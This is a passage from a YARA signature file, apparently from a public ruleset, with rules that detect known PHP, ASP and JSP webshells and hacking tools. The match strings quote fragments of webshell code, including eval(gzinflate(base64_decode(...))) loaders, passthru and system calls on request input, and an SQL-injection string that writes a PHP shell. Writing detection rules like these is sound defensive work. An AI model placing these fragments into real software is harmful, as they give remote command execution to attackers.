      $s0 = "window.open(\"\"&url&\"?id=edit&path=\"+sfile+\"&op=copy&attrib=\"+attrib+\"&dpath=\"+lp" 
      $s3 = "<input name=\"dbname\" type=\"hidden\" id=\"dbname\" value=\"<%=request(\"dbname\")%>\">" 
   condition: 
      all of them
} 

rule HKTL_Mithril_tool_RID2D99 : DEMO HKTL T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file Mithril.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 10:38:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "OpenProcess error!" 
      $s1 = "WriteProcessMemory error!" 
      $s4 = "GetProcAddress error!" 
      $s5 = "HHt`HHt\\" 
      $s6 = "Cmaudi0" 
      $s7 = "CreateRemoteThread error!" 
      $s8 = "Kernel32" 
      $s9 = "VirtualAllocEx error!" 
   condition: 
      all of them
} 

rule HKTL_Release_dllTest_RID2E9F : DEMO HKTL T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file dllTest.dll"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 11:22:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = ";;;Y;`;d;h;l;p;t;x;|;" 
      $s1 = "0 0&00060K0R0X0f0l0q0w0" 
      $s2 = ": :$:(:,:0:4:8:D:`=d=" 
      $s3 = "4@5P5T5\\5T7\\7d7l7t7|7" 
      $s4 = "1,121>1C1K1Q1X1^1e1k1s1y1" 
      $s5 = "9 9$9(9,9P9X9\\9`9d9h9l9p9t9x9|9" 
      $s6 = "0)0O0\\0a0o0\"1E1P1q1" 
      $s7 = "<.<I<d<h<l<p<t<x<|<" 
      $s8 = "3&31383>3F3Q3X3`3f3w3|3" 
      $s9 = "8@;D;H;L;P;T;X;\\;a;9=W=z=" 
   condition: 
      all of them
} 

rule HKTL_adjustcr_RID2C03 : DEMO HKTL T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file adjustcr.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 09:31:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "$Info: This file is packed with the UPX executable packer $" 
      $s2 = "$License: NRV for UPX is distributed under special license $" 
      $s6 = "AdjustCR Carr" 
      $s7 = "ION\\System\\FloatingPo" 
   condition: 
      all of them
} 

rule HKTL_peek_a_boo_RID2CA7 : DEMO HKTL T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file peek-a-boo.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 09:58:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "__vbaHresultCheckObj" 
      $s1 = "\\VB\\VB5.OLB" 
      $s2 = "capGetDriverDescriptionA" 
      $s3 = "__vbaExceptHandler" 
      $s4 = "EVENT_SINK_Release" 
      $s8 = "__vbaErrorOverflow" 
   condition: 
      all of them
} 

rule HKTL_ZXshell2_0_rar_Folder_zxrecv_RID338E : DEMO HKTL T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file zxrecv.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 14:52:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "RyFlushBuff" 
      $s1 = "teToWideChar^FiYP" 
      $s2 = "mdesc+8F D" 
      $s3 = "\\von76std" 
      $s4 = "5pur+virtul" 
      $s5 = "- Kablto io" 
      $s6 = "ac#f{lowi8a" 
   condition: 
      all of them
} 

rule HKTL_HDConfig_RID2B85 : DEMO HKTL T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file HDConfig.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 09:10:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "An encryption key is derived from the password hash. " 
      $s3 = "A hash object has been created. " 
      $s4 = "Error during CryptCreateHash!" 
      $s5 = "A new key container has been created." 
      $s6 = "The password has been added to the hash. " 
   condition: 
      all of them
} 

rule WebShell_hiddens_shell_v1_RID30E2 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file hiddens shell v1.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 12:58:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<?$d='G7mHWQ9vvXiL/QX2oZ2VTDpo6g3FYAa6X+8DMIzcD0eHZaBZH7jFpZzUz7XNenxSYvBP2Wy36U" 
   condition: 
      all of them
} 

rule WebShell_Uploader_RID2DC2 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file Uploader.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 10:45:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "move_uploaded_file($userfile, \"entrika.php\"); " fullword
   condition: 
      all of them
} 

rule WebShell_php_webshells_README_RID3203 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file README.md"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 13:47:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Common php webshells. Do not host the file(s) in your server!" fullword
      $s1 = "php-webshells" fullword
   condition: 
      all of them
} 

rule WebShell_accept_language_RID3099 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file accept_language.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 12:46:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<?php passthru(getenv(\"HTTP_ACCEPT_LANGUAGE\")); echo '<br> by q1w2e3r4'; ?>" fullword
   condition: 
      all of them
} 

rule WebShell_mysql_tool_RID2ED9 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file mysql_tool.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 11:32:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s12 = "$dump .= \"-- Dumping data for table '$table'\\n\";" fullword
      $s20 = "$dump .= \"CREATE TABLE $table (\\n\";" fullword
   condition: 
      2 of them
} 

rule Webshell_HYTop_DevPack_fso_RID311E : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file fso.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 13:08:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<!-- PageFSO Below -->" 
      $s1 = "theFile.writeLine(\"<script language=\"\"vbscript\"\" runat=server>if request(\"\"\"&cli" 
   condition: 
      all of them
} 

rule Webshell_FeliksPack3___PHP_Shells_ssh_RID3532 : DEMO T1021 T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells PHP Webshell - file ssh.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 16:02:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      type = "file"
      tags = "DEMO, T1021, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "eval(gzinflate(str_rot13(base64_decode('" 
   condition: 
      all of them
} 

rule MAL_Debug_BDoor_RID2C66 : DEMO MAL T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file BDoor.dll"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 09:47:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, MAL, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "\\BDoor\\" 
      $s4 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" 
   condition: 
      all of them
} 

rule ZXshell2_0_rar_Folder_ZXshell_RID3224 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file ZXshell.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 13:52:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "WPreviewPagesn" 
      $s1 = "DA!OLUTELY N" 
   condition: 
      all of them
} 

rule thelast_orice2_RID2CA9 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file orice2.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 09:58:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = " $aa = $_GET['aa'];" 
      $s1 = "echo $aa;" 
   condition: 
      all of them
} 

rule FSO_s_sincap_RID2BA8 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file sincap.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 09:15:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "    <font color=\"#E5E5E5\" style=\"font-size: 8pt; font-weight: 700\" face=\"Arial\">" 
      $s4 = "<body text=\"#008000\" bgcolor=\"#808080\" topmargin=\"0\" leftmargin=\"0\" rightmargin=" 
   condition: 
      all of them
} 

rule Webshell_PhpShell_1_RID2E56 : DEMO T1086 T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file PhpShell.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 11:10:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1086, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "href=\"http://www.gimpster.com/wiki/PhpShell\">www.gimpster.com/wiki/PhpShell</a>." 
   condition: 
      all of them
} 

rule Webshell_HYTop_DevPack_config_RID324C : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file config.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 13:59:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "const adminPassword=\"" 
      $s2 = "const userPassword=\"" 
      $s3 = "const mVersion=" 
   condition: 
      all of them
} 

rule Webshell_FSO_s_zehir4_RID2F15 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file zehir4.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 11:42:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s5 = " byMesaj " 
   condition: 
      all of them
} 

rule Webshell_iMHaPFtp_RID2D7F : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file iMHaPFtp.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 10:34:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "echo \"\\t<th class=\\\"permission_header\\\"><a href=\\\"$self?{$d}sort=permission$r\\\">" 
   condition: 
      all of them
} 

rule Webshell_Unpack_TBack_RID2F2C : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file TBack.dll"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 11:45:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s5 = "\\final\\new\\lcc\\public.dll" 
   condition: 
      all of them
} 

rule Webshell_DarkSpy105_RID2DFA : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file DarkSpy105.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 10:54:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s7 = "Sorry,DarkSpy got an unknown exception,please re-run it,thanks!" 
   condition: 
      all of them
} 

rule Webshell_FSO_s_reader_RID2F32 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file reader.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 11:46:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "mailto:mailbomb@hotmail." 
   condition: 
      all of them
} 

rule Webshell_KA_uShell_RID2DFE : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file KA_uShell.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 10:55:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s5 = "if(empty($_SERVER['PHP_AUTH_PW']) || $_SERVER['PHP_AUTH_PW']<>$pass" 
      $s6 = "if ($_POST['path']==\"\"){$uploadfile = $_FILES['file']['name'];}" 
   condition: 
      all of them
} 

rule Webshell_PHP_Backdoor_v1_RID3018 : DEMO MAL T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file PHP Backdoor v1.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 12:25:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, MAL, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s5 = "echo\"<form method=\\\"POST\\\" action=\\\"\".$_SERVER['PHP_SELF'].\"?edit=\".$th" 
      $s8 = "echo \"<a href=\\\"\".$_SERVER['PHP_SELF'].\"?proxy" 
   condition: 
      all of them
} 

rule HYTop_DevPack_server_RID2ED8 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file server.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 11:31:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<!-- PageServer Below -->" 
   condition: 
      all of them
} 

rule saphpshell_RID2B45 : DEMO T1086 T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file saphpshell_RID2B45.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 08:59:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1086, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<td><input type=\"text\" name=\"command\" size=\"60\" value=\"<?=$_POST['command']?>" 
   condition: 
      all of them
} 

rule HYTop2006_rar_Folder_2006Z_RID2F8D : DEMO T1050 T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file 2006Z.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 12:02:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1050, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "wangyong,czy,allen,lcx,Marcos,kEvin1986,myth" 
      $s8 = "System\\CurrentControlSet\\Control\\Keyboard Layouts\\%.8x" 
   condition: 
      all of them
} 

rule Webshell_admin_ad_RID2DD3 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file admin-ad.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 10:48:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s6 = "<td align=\"center\"> <input name=\"cmd\" type=\"text\" id=\"cmd\" siz" 
      $s7 = "Response.write\"<a href='\"&url&\"?path=\"&Request(\"oldpath\")&\"&attrib=\"&attrib&\"'><" 
   condition: 
      all of them
} 

rule Webshell_FSO_s_casus15_RID2F44 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file casus15.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 11:49:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s6 = "if((is_dir(\"$deldir/$file\")) AND ($file!=\".\") AND ($file!=\"..\"))" 
   condition: 
      all of them
} 

rule WebShell_toolaspshell_RID2FA0 : DEMO T1086 T1100 T1136 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file toolaspshell.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 12:05:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1086, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "cprthtml = \"<font face='arial' size='1'>RHTOOLS 1.5 BETA(PVT) Edited By KingDef" 
      $s1 = "barrapos = CInt(InstrRev(Left(raiz,Len(raiz) - 1),\"\\\")) - 1" fullword
      $s2 = "destino3 = folderItem.path & \"\\index.asp\"" fullword
   condition: 
      2 of them
} 

rule WebShell_b374k_mini_shell_php_php_RID33C2 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file b374k-mini-shell-php.php.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 15:01:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "@error_reporting(0);" fullword
      $s2 = "@eval(gzinflate(base64_decode($code)));" fullword
      $s3 = "@set_time_limit(0); " fullword
   condition: 
      all of them
} 

rule WebShell_Sincap_1_0_RID2E03 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file Sincap 1.0.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 10:56:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s4 = "</font></span><a href=\"mailto:shopen@aventgrup.net\">" fullword
      $s5 = "<title>:: AventGrup ::.. - Sincap 1.0 | Session(Oturum) B" fullword
      $s9 = "</span>Avrasya Veri ve NetWork Teknolojileri Geli" fullword
      $s12 = "while (($ekinci=readdir ($sedat))){" fullword
      $s19 = "$deger2= \"$ich[$tampon4]\";" fullword
   condition: 
      2 of them
} 

rule WebShell_b374k_php_RID2D98 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file b374k.php.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 10:38:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "// encrypt your password to md5 here http://kerinci.net/?x=decode" fullword
      $s6 = "// password (default is: b374k)" 
      $s8 = "//******************************************************************************" 
      $s9 = "// b374k 2.2" fullword
      $s10 = "eval(\"?>\".gzinflate(base64_decode(" 
   condition: 
      3 of them
} 

rule WebShell_h4ntu_shell__powered_by_tsoi__RID365B : DEMO T1033 T1100 T1136 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file h4ntu shell [powered by tsoi].php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 16:52:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1033, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s11 = "<title>h4ntu shell [powered by tsoi]</title>" fullword
      $s13 = "$cmd = $_POST['cmd'];" fullword
      $s16 = "$uname = posix_uname( );" fullword
      $s17 = "if(!$whoami)$whoami=exec(\"whoami\");" fullword
      $s18 = "echo \"<p><font size=2 face=Verdana><b>This Is The Server Information</b></font>" 
      $s20 = "ob_end_clean();" fullword
   condition: 
      3 of them
} 

rule WebShell_php_webshells_MyShell_RID3313 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file MyShell.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 14:32:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s3 = "<title>MyShell error - Access Denied</title>" fullword
      $s4 = "$adminEmail = \"youremail@yourserver.com\";" fullword
      $s5 = "//A workdir has been asked for - we chdir to that dir." fullword
      $s6 = "system($command . \" 1> /tmp/output.txt 2>&1; cat /tmp/output.txt; rm /tmp/o" 
      $s13 = "#$autoErrorTrap Enable automatic error traping if command returns error." fullword
      $s14 = "/* No work_dir - we chdir to $DOCUMENT_ROOT */" fullword
      $s19 = "#every command you excecute." fullword
      $s20 = "<form name=\"shell\" method=\"post\">" fullword
   condition: 
      3 of them
} 

rule WebShell_php_webshells_pHpINJ_RID325E : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file pHpINJ.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 14:02:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s3 = "echo '<a href='.$expurl.'> Click Here to Exploit </a> <br />';" fullword
      $s10 = "<form action = \"<?php echo \"$_SERVER[PHP_SELF]\" ; ?>\" method = \"post\">" fullword
      $s11 = "$sql = \"0' UNION SELECT '0' , '<? system(\\$_GET[cpc]);exit; ?>' ,0 ,0 ,0 ,0 IN" 
      $s13 = "Full server path to a writable file which will contain the Php Shell <br />" fullword
      $s14 = "$expurl= $url.\"?id=\".$sql ;" fullword
      $s15 = "<header>||   .::News PHP Shell Injection::.   ||</header> <br /> <br />" fullword
      $s16 = "<input type = \"submit\" value = \"Create Exploit\"> <br /> <br />" fullword
   condition: 
      1 of them
} 

rule WebShell_ru24_post_sh_RID2F32 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file ru24_post_sh.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 11:46:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "http://www.ru24-team.net" fullword
      $s4 = "if ((!$_POST['cmd']) || ($_POST['cmd']==\"\")) { $_POST['cmd']=\"id;pwd;uname -a" 
      $s6 = "Ru24PostWebShell" 
      $s7 = "Writed by DreAmeRz" fullword
      $s9 = "$function=passthru; // system, exec, cmd" fullword
   condition: 
      1 of them
} 

rule WebShell_c99_locus7s_RID2E8A : DEMO T1087 T1100 T1136 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file c99_locus7s.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 11:18:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1087, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s8 = "$encoded = base64_encode(file_get_contents($d.$f)); " fullword
      $s9 = "$file = $tmpdir.\"dump_\".getenv(\"SERVER_NAME\").\"_\".$db.\"_\".date(\"d-m-Y" 
      $s10 = "else {$tmp = htmlspecialchars(\"./dump_\".getenv(\"SERVER_NAME\").\"_\".$sq" 
      $s11 = "$c99sh_sourcesurl = \"http://locus7s.com/\"; //Sources-server " fullword
      $s19 = "$nixpwdperpage = 100; // Get first N lines from /etc/passwd " fullword
   condition: 
      2 of them
} 

rule WebShell_JspWebshell_1_2_RID300A : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file JspWebshell_1.2.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 12:22:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "System.out.println(\"CreateAndDeleteFolder is error:\"+ex); " fullword
      $s1 = "String password=request.getParameter(\"password\");" fullword
      $s3 = "<%@ page contentType=\"text/html; charset=GBK\" language=\"java\" import=\"java." 
      $s7 = "String editfile=request.getParameter(\"editfile\");" fullword
      $s8 = "//String tempfilename=request.getParameter(\"file\");" fullword
      $s12 = "password = (String)session.getAttribute(\"password\");" fullword
   condition: 
      3 of them
} 

rule WebShell_cgitelnet_RID2E45 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file cgitelnet.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 11:07:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s9 = "# Author Homepage: http://www.rohitab.com/" fullword
      $s10 = "elsif($Action eq \"command\") # user wants to run a command" fullword
      $s18 = "# in a command line on Windows NT." fullword
      $s20 = "print \"Transfered $TargetFileSize Bytes.<br>\";" fullword
   condition: 
      2 of them
} 

rule WebShell_lamashell_RID2E39 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file lamashell.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 11:05:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "if(($_POST['exe']) == \"Execute\") {" fullword
      $s8 = "$curcmd = $_POST['king'];" fullword
      $s16 = "\"http://www.w3.org/TR/html4/loose.dtd\">" fullword
      $s18 = "<title>lama's'hell v. 3.0</title>" fullword
      $s19 = "_|_  O    _    O  _|_" fullword
      $s20 = "$curcmd = \"ls -lah\";" fullword
   condition: 
      2 of them
} 

rule WebShell_AK_74_Security_Team_Web_Shell_Beta_Version_RID3A6D : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file AK-74 Security Team Web Shell Beta Version.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 19:46:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s8 = "- AK-74 Security Team Web Site: www.ak74-team.net" fullword
